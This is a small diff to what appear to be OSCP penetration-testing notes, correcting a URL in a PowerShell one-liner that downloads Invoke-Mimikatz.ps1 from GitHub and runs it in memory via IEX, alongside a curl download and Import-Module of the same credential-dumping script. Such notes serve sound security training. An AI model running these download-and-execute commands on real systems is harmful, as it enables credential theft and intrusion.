@@ -1238,7 +1238,7 @@ curl https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1 -Outfile Inv
 Import-Module .\Invoke-Mimikatz.ps1
 ```
 ```
-IEX(New-Object System.Net.WebClient).DownloadString("github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
 ```
 
 
